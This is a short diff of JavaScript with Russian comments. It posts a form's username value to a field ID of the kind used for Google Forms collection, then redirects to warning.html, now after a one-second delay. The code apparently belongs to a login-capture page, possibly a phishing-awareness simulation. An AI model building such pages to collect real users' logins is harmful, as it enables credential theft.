@@ -135,16 +135,13 @@
                     'entry.2121935433': formData.username   // ID поля для логина
                 })
             })
+            
+
             .then(() => {
     setTimeout(() => {
         window.location.href = 'warning.html';
     }, 1000); // подождать 1 секунду
 })
-
-            .then(() => {
-                // Перенаправление на warning.html
-                window.location.href = 'warning.html';
-            })
             .catch((error) => {
                 console.error('Ошибка:', error);
                 // Все равно перенаправляем, даже если отправка не удалась
